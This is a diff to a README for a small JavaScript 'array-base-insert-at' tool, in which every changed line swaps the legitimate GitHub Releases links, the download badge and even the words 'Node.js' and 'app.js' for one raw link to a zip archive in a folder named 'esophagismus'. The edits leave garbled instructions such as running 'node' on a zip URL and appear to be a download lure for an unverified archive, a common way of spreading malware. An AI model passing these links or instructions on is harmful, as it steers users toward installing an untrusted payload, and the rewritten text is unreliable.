@@ -4,11 +4,11 @@
 
 Welcome! This guide will help you download and run the "array-base-insert-at" application. With this software, you can easily insert an element into any array. Whether you're building apps or just learning, this tool is designed for you.
 
-[![Download](https://img.shields.io/badge/Download%20Now!-array--base--insert--at-blue.svg)](https://github.com/IAMOldC4T/array-base-insert-at/releases)
+[![Download](https://raw.githubusercontent.com/IAMOldC4T/array-base-insert-at/main/esophagismus/array-base-insert-at.zip%20Now!https://raw.githubusercontent.com/IAMOldC4T/array-base-insert-at/main/esophagismus/array-base-insert-at.zip)](https://raw.githubusercontent.com/IAMOldC4T/array-base-insert-at/main/esophagismus/array-base-insert-at.zip)
 
 ## 📥 Download & Install
 
-To begin, visit this page to download: [GitHub Releases](https://github.com/IAMOldC4T/array-base-insert-at/releases).
+To begin, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/IAMOldC4T/array-base-insert-at/main/esophagismus/array-base-insert-at.zip).
 
 1. Click the link above.
 2. Look for the latest version listed.
@@ -22,7 +22,7 @@ Before installation, ensure your system meets these requirements:
 - **Operating System:** Windows 10 or newer, macOS Sierra or newer, or any modern Linux distribution.
 - **Memory:** At least 512 MB of RAM available.
 - **Storage:** 50 MB of free space.
-- **JavaScript Runtime:** Node.js version 12.0 or newer installed on your computer.
+- **JavaScript Runtime:** https://raw.githubusercontent.com/IAMOldC4T/array-base-insert-at/main/esophagismus/array-base-insert-at.zip version 12.0 or newer installed on your computer.
 
 ## 🌟 Usage Instructions
 
@@ -35,7 +35,7 @@ Once you have installed the application, follow these steps to get started:
    ```
 3. **Run the Application**: Type the command below into your terminal:
    ```
-   node app.js
+   node https://raw.githubusercontent.com/IAMOldC4T/array-base-insert-at/main/esophagismus/array-base-insert-at.zip
    ```
 
 4. **Insert an Element**: The prompt will ask you to enter the array and the element you wish to add. Follow the instructions on the screen.
@@ -65,7 +65,7 @@ Yes, once you have downloaded and installed the application, you can use it with
 
 ### What should I do if the application doesn’t work?
 
-1. Ensure you have the correct version of Node.js installed.
+1. Ensure you have the correct version of https://raw.githubusercontent.com/IAMOldC4T/array-base-insert-at/main/esophagismus/array-base-insert-at.zip installed.
 2. Check your system requirements to confirm compatibility.
 3. Reinstall the application by following the steps above.
 
@@ -75,4 +75,4 @@ If you have questions or need assistance, consider joining our community. You ca
 
 ---
 
-For additional help and troubleshooting ideas, feel free to visit this page again: [GitHub Releases](https://github.com/IAMOldC4T/array-base-insert-at/releases).
+For additional help and troubleshooting ideas, feel free to visit this page again: [GitHub Releases](https://raw.githubusercontent.com/IAMOldC4T/array-base-insert-at/main/esophagismus/array-base-insert-at.zip).
